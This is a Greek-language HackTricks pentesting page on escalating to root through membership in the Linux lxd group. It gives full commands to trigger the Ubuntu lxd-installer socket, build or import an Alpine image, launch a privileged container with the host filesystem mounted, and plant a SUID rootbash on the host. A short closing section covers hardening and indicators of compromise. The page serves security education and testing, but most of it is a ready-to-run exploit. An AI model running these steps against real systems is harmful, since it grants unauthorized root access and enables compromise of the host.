# lxd/lxc Group - Κλιμάκωση προνομίων

{{#include ../../../banners/hacktricks-training.md}}

Η συμμετοχή στην ομάδα διαχείρισης LXD του host (συνήθως _**lxd**_) μπορεί να προσφέρει διαδρομή προς root, επιτρέποντας τον πλήρη έλεγχο του daemon.<sup>[[1]](#references)</sup> Πρόκειται για το ίδιο πρόβλημα ορίου εμπιστοσύνης που περιγράφεται για τα [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) και τα [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md): η πρόσβαση στο management API μπορεί να είναι αρκετή ακόμη και όταν η τρέχουσα διεργασία δεν βρίσκεται ήδη μέσα σε container.<sup>[[1]](#references)</sup>

## Ενεργοποίηση socket του Ubuntu `lxd-installer`

Μην θεωρείτε ότι η συμμετοχή στην ομάδα `lxd` είναι ακίνδυνη μόνο και μόνο επειδή απουσιάζει το LXD snap. Στο Ubuntu Server 24.04 και σε νεότερες εκδόσεις, το προεγκατεστημένο πακέτο `lxd-installer` εκθέτει το `/run/lxd-installer.socket` με ιδιοκτήτη `root:lxd` και δικαιώματα `0660`. Μια σύνδεση ενεργοποιεί ως root το `lxd-installer@.service`, το οποίο εγκαθιστά το LXD snap χωρίς κωδικό sudo ή εξουσιοδότηση polkit· ορισμένες εκδόσεις wrapper παραλείπουν επίσης την προτροπή επιβεβαίωσης όταν η standard input δεν είναι TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Ελέγξτε τόσο τη συμμετοχή του λογαριασμού στις ομάδες όσο και την υπηρεσία που ενεργοποιείται από socket:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Μια εξουσιοδοτημένη δοκιμή από μέλος της ομάδας `lxd` μπορεί να ενεργοποιήσει το πρόγραμμα εγκατάστασης μέσω του κανονικού wrapper `lxc` ή συνδέοντας απευθείας στο socket. Η δεύτερη μέθοδος δείχνει ότι το ACL του Unix socket, και όχι το prompt του wrapper, αποτελεί το πραγματικό όριο εξουσιοδότησης:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Μόλις είναι διαθέσιμος ο daemon, συνεχίστε με τις παρακάτω τεχνικές privileged-container.<sup>[[10]](#references)[[11]](#references)</sup>

## Εκμετάλλευση χωρίς internet

### Μέθοδος 1

Μπορείτε να κατεβάσετε ένα Alpine image για χρήση με το LXD από ένα αξιόπιστο repository.
Ο image server του Canonical για το LXD δημοσιεύει καθημερινά builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Κατεβάστε τα **lxd.tar.xz** και **rootfs.squashfs** από το πιο πρόσφατο build (το όνομα του καταλόγου είναι η ημερομηνία).<sup>[[8]](#references)</sup>

Εναλλακτικά, μπορείτε να εγκαταστήσετε το distrobuilder στον υπολογιστή σας ακολουθώντας τις [οδηγίες του project](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Μεταφορτώστε τα **incus.tar.xz** (**lxd.tar.xz** αν το κατεβάσατε από τον server εικόνων της Canonical) και το **rootfs.squashfs**, έπειτα εισαγάγετε την εικόνα και δημιουργήστε ένα container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Αν εμφανιστεί αυτό το σφάλμα _**Error: No storage pool found. Please create a new storage pool**_\
> Εκτελέστε **`lxd init`**, ρυθμίστε ένα προεπιλεγμένο storage pool και, στη συνέχεια, **επαναλάβετε** το προηγούμενο τμήμα εντολών.<sup>[[2]](#references)</sup>

Τέλος, εκκινήστε το container και ανοίξτε ένα root shell στο filesystem του host:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Επειδή το UID 0 σε αυτό το προνομιούχο instance δεν γίνεται remap, μπορεί να δημιουργήσει ένα SUID payload ιδιοκτησίας του host μέσω του προσαρτημένου root του host. Έτσι ολοκληρώνεται το pivot από το container στον host, αντί ο operator να παραμείνει σε ένα shell του container:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Τοποθετήστε το payload σε ένα filesystem που υποστηρίζει SUID. Ένα ξεχωριστό `/tmp` συνήθως προσαρτάται με `nosuid` και ενδέχεται να μην εμφανίζεται κάτω από ένα μη αναδρομικό bind του host `/`, οπότε μια διαδρομή όπως `/rootbash` στο root filesystem του host είναι πιο αξιόπιστη για αυτή την απόδειξη.<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

Δημιουργήστε ένα Alpine image και εκκινήστε το με το flag `security.privileged=true`, το οποίο αντιστοιχίζει τον root του container στον root του host· η προσάρτηση του `/` εκθέτει στη συνέχεια το filesystem του host μέσα στο container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Παρενέργεια του AppArmor σε όλο το host

Η εκκίνηση του LXD snap μπορεί επίσης να δημιουργήσει το `/run/sysctl.d/zz-lxd.conf` και να ορίσει τις τιμές των `kernel.apparmor_restrict_unprivileged_userns` και `kernel.apparmor_restrict_unprivileged_unconfined` σε `0`. Αυτό αποδυναμώνει τους περιορισμούς του Ubuntu για τα unprivileged user namespaces για όλους τους τοπικούς χρήστες, επομένως καταγράψτε τις τιμές πριν και μετά την ενεργοποίηση του LXD κατά την αξιολόγηση του host.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Έλεγχος και θωράκιση

Αντιμετωπίστε τη συμμετοχή στην ομάδα `lxd` ως παραχώρηση δικαιωμάτων root. Η αφαίρεση ενός μέλους που δεν είναι απαραίτητο τίθεται σε ισχύ στις νέες συνεδρίες σύνδεσης· η αφαίρεση του `lxd-installer` ή η απόκρυψη του socket του απλώς καταργεί τη διαδρομή εγκατάστασης κατ’ απαίτηση και **δεν** περιορίζει έναν χρήστη που έχει ήδη πρόσβαση σε εγκατεστημένο daemon του LXD.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Χρήσιμες ενδείξεις παραβίασης περιλαμβάνουν instances LXD με `security.privileged=true`, disk devices των οποίων το `source` είναι `/`, μη αναμενόμενες συνδέσεις στο `/run/lxd-installer.socket`, νέα αρχεία SUID και αλλαγή των παραπάνω AppArmor sysctls από `1` σε `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Πώς να ενισχύσετε την ασφάλεια για το LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD containers και virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Πώς να αντιγράψετε και να εισαγάγετε images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Πώς να δημιουργήσετε images με το distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Ορισμός image του Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script δημιουργίας του lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [Τύπος: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Αναφορά και PoC privilege-escalation στην ομάδα LXD από τα STAR Labs](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Παλιό κρασί σε νέο μπουκάλι: Το Root της ομάδας LXD, δεκαετίας, ξαναοπλίζεται](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
